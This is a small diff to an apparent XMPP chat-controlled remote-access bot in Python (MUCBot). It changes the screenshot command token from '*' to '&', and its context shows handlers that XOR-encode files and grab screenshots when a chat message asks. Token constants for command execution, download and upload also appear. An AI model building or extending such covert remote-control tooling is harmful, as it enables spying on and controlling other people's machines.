@@ -23,7 +23,7 @@ CMD_TOKEN = '$'
 DWNLD_TOKEN = '!'
 UPLD_TOKEN = '^'
 XOR_TOKEN = '%'
-SCRN_TOKEN = '*'
+SCRN_TOKEN = '&'
 
 SERVICE_DISCOVERY = 'xep_0030'
 MULTIUSER_CHAT = 'xep_0045'
@@ -101,7 +101,7 @@ class MUCBot(sleekxmpp.ClientXMPP):
         self.xor(file_name, file_name+".new", self.xor_var)
         msg.reply("file saved as "+file_name+".new").send()
         return
-      # Execute and respond to the *screenshot instruction  
+      # Execute and respond to the &screenshot instruction  
       if body and body[0] == SCRN_TOKEN:
         file_name = format(body.lstrip(SCRN_TOKEN))
         ImageGrab.grab_to_file(file_name+".png")
